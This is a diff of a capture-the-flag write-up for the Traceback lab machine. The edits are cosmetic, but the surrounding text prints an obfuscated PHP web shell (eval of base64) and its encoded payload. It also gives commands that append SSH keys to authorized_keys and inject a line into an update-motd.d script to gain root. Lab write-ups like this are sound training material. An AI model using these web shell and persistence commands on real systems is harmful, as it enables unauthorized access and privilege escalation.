@@ -58,7 +58,7 @@ I wasn't able to login, but I noticed a banner saying that the system had been o
 
 ### HTTP
 
-![](/assets/img/screenshot_2020-06-21_16-48-34%20%281%29.png)
+![Website on port 80](/assets/img/screenshot_2020-06-21_16-48-34%20%281%29.png)
 
 Connecting to port 80 through a web browser gave me a very similar message. It also said something about a backdoor, so I fired up `gobuster` to see if I could find any other pages since there were no other hints or ways to progress.  
 
@@ -72,7 +72,7 @@ Unfortunately this did not get me anywhere, as the connection was blocked and I 
 
 Next I tried a web search for `FREE INTERNETZZZ`, which led me to Twitter of all places.
 
-![](/assets/img/free-internetzzzz.png)
+![A message left by the hackers](/assets/img/free-internetzzzz.png)
 
 "Pretty interesting collection of webshells:"  says the [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936) of this machine...and posted around the same time as the release \(14 Mar 2020 - See [info card](#overview)\).  This felt a lot like an OSINT-type challenge to me.   Clicking on the post led to a collection of "Some of the best web shells that you might need" at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
 
@@ -109,11 +109,11 @@ Requests/sec.: 18.04628
 
 Using `wfuzz` I was able to find the web shell used at `http://10.10.10.181/smevk.php`.I navigated to this page and got a login screen.
 
-![](/assets/img/screenshot_2020-06-22_13-13-58.png)
+![Screenshot of the web shell backdoor](/assets/img/screenshot_2020-06-22_13-13-58.png)
 
 I opened the code of the `smevk.php` web shell that I had downloaded earlier and didn't have to search long to find what I was looking for.
 
-```text
+```php
 <?php 
 /*
 SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
@@ -152,7 +152,7 @@ eval("?>".(base64_decode($smevk)));
 
 The code came with hard-coded default credentials of `admin:admin`. I tried them out on the login page, and was granted access to the shell page.
 
-![](/assets/img/screenshot_2020-06-22_13-18-32.png)
+![Screenshot of the web shell admin page](/assets/img/screenshot_2020-06-22_13-18-32.png)
 
 When I first started poking around, clicking on buttons and trying to use the shell to enumerate the system I was getting a bit frustrated.  Nothing seemed to be working.  Below are my original notes:
 
@@ -160,7 +160,7 @@ When I first started poking around, clicking on buttons and trying to use the sh
 
 For some reason the web shell did not function properly in Firefox.  When I finally got tired of banging my head against the shell trying to find something that worked, I decided to try opening it in Chromium instead...and everything worked!
 
-```text
+```php
 zweilos@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
 SFRUUF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwog\
 ICAgZXhpdDsKfQoKQHNlc3Npb25fc3RhcnQoKTsKQGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBp\
@@ -205,7 +205,7 @@ After doing some troubleshooting and looking into the code it seemed as if the w
 
 ## Road to User
 
-![](/assets/img/screenshot_2020-06-22_17-41-38.png)
+![Enumeration using the web shell](/assets/img/screenshot_2020-06-22_17-41-38.png)
 
 I noticed that the web shell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file of that user to see if it would let me log in that way. I entered the command `echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `Console` field of the web shell.  _\(Notice the append operator `>>`?  Please be nice to your fellow players and don't overwrite the whole file with `>`!\)_
 
@@ -293,7 +293,7 @@ true    'exit'  0
 
 While reading up on how to execute commands in this `luvit` shell, I came across this page [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html) which described a way to execute commands that were more complex than a simple "command" .. "argument" format.
 
-```text
+```lua
 > os.execute 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/sysadmin/.ssh/authorized_keys'
 ```
 
@@ -363,7 +363,7 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 
 Interestingly, the files in `/etc/update-motd.d/` were editable by `sysadmin`. _\(The backups were not\)._
 
-```text
+```bash
 sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
 #!/bin/sh
 #
@@ -397,7 +397,7 @@ The file `00-header`seem to have been edited already by `Xh4H` when he defaced t
 
 According to the `ps` output, every 30 secs a cronjob copies the backups from `/var/backups/.update-motd.d/` to `/etc/update-motd.d/`. This was the window I had to edit the file and get it to execute to initiate my exploit before the backup wiped my progress. I decided to go for broke and simply use the same privilege escalation method I had already been using. 
 
-```text
+```bash
 sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /root/.ssh/authorized_keys' >> 00-header
 ```
 
